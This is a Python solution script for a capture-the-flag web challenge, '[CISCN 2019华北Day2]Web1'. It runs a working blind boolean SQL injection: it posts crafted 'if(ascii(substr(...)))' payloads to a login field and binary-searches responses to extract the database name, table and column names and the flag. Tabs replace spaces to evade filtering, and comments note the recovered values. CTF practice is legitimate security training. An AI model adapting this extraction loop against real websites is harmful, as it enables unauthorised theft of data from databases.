# [CISCN 2019华北Day2]Web1
import time
from requests_html import AsyncHTMLSession, HTMLSession
import re
url = 'http://542-3ab5aede-1341-4b5d.nss.ctfer.vip:9080/'
flag_success = 'Hello'

payload1_database_length = '1\' or length(database())={}#'
# payload_database = '1\' or ord(substr(database(),{},1))>{}#'
# payload_data = '1\' or ord( SUBSTR((select group_concat({}) from {}),{},1))>{}#'
payload_database = 'if(ascii(substr(database(),{},1))>{},1,2)'
# payload_table = '-1\' or if(aScii(SUBSTR((selEct group_concat(table_name) from information_schema.tables where tablE_schema=database()),{},1))>{},1,0) #' # group_concat过滤了用不了
# payload_column = '1\' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}#'
payload_data = 'if(ascii(SUBSTR((select	{}	from	{}),{},1))>{},1,2)'
# payload_data = 'if(ascii(SUBSTR((select {} from {}),{},1))>{},1,2)'.replace(' ', '\t')
key = "id"

start_time = time.time()

session = HTMLSession()
proxies = {}


def go(title, payload):
    db = ''
    for i in range(1, 128):
        s = search(i, payload)
        if not 1 < ord(s) <= 128:
            break
        db += s
        print(f'{title} = ', db)


def search(index, payload):
    low = 32
    high = 128
    mid = (low + high) // 2
    while low < high:
        data = {
            key: payload.format(index, mid),
            'password': '',
        }
        res = session.post(url, data=data)
        h = re.sub(r'<html.*</html>\n', '', res.text, flags=re.DOTALL)
        if flag_success in res.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

        if mid == 32:
            break
    return chr(mid)


if __name__ == '__main__':
    table_name = 'flag'
    column_name = 'flag'

    # go('database', payload_database)  # 'ctftraining'
    # go('table', payload_table)  # 'loflag'
    # go('column', payload_column.format(table_name, '{}', '{}'))  # Id,flaglo
    go('data', payload_data.format(column_name, table_name, '{}', '{}'))
    print("--- %s seconds ---" % (time.time() - start_time))
